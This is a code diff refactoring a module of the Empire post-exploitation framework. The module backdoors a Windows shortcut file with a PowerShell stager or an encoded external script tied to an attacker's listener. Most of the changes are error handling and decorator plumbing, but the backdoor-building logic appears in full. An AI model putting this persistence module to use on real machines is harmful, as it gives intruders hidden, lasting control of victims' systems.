@@ -1,19 +1,23 @@
-import os
+from pathlib import Path
 
 from empire.server.common import helpers
 from empire.server.common.empire import MainMenu
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
+from empire.server.core.module_service import auto_finalize, auto_get_source
 
 
 class Module:
     @staticmethod
+    @auto_get_source
+    @auto_finalize
     def generate(
         main_menu: MainMenu,
         module: EmpireModule,
         params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
+        script: str = "",
     ):
         # management options
         lnk_path = params["LNKPath"]
@@ -35,7 +39,7 @@ class Module:
 
         if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
             # not a valid listener, return nothing for the script
-            return handle_error_message("[!] Invalid listener: " + listener_name)
+            raise ModuleValidationException("Invalid listener: " + listener_name)
 
         # generate the PowerShell one-liner with all of the proper options set
         launcher = main_menu.stagergenv2.generate_launcher(
@@ -51,16 +55,6 @@ class Module:
         )
         launcher = launcher.replace("$", "`$")
 
-        # read in the common module source code
-        script, err = main_menu.modulesv2.get_module_source(
-            module_name=module.script_path,
-            obfuscate=obfuscate,
-            obfuscate_command=obfuscation_command,
-        )
-
-        if err:
-            return handle_error_message(err)
-
         script_end = "Invoke-BackdoorLNK "
 
         if cleanup.lower() == "true":
@@ -73,20 +67,24 @@ class Module:
             if ext_file != "":
                 # read in an external file as the payload and build a
                 #   base64 encoded version as encScript
-                if os.path.exists(ext_file):
-                    with open(ext_file) as f:
-                        file_data = f.read()
+                ext_path = Path(ext_file)
+                if ext_path.exists():
+                    file_data = ext_path.read_text()
 
                     # unicode-base64 encode the script for -enc launching
                     encScript = helpers.enc_powershell(file_data)
                     status_msg += "using external file " + ext_file
 
                 else:
-                    return handle_error_message("[!] File does not exist: " + ext_file)
+                    raise ModuleValidationException(
+                        "[!] File does not exist: " + ext_file
+                    )
 
             elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                 # not a valid listener, return nothing for the script
-                return handle_error_message("[!] Invalid listener: " + listener_name)
+                raise ModuleValidationException(
+                    "[!] Invalid listener: " + listener_name
+                )
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
@@ -109,9 +107,4 @@ class Module:
             script_end += f" -EncScript '{encScript}'"
             script_end += f"; \"Invoke-BackdoorLNK run on path '{lnk_path}' with stager for listener '{listener_name}'\""
 
-        return main_menu.modulesv2.finalize_module(
-            script=script,
-            script_end=script_end,
-            obfuscate=obfuscate,
-            obfuscation_command=obfuscation_command,
-        )
+        return script, script_end
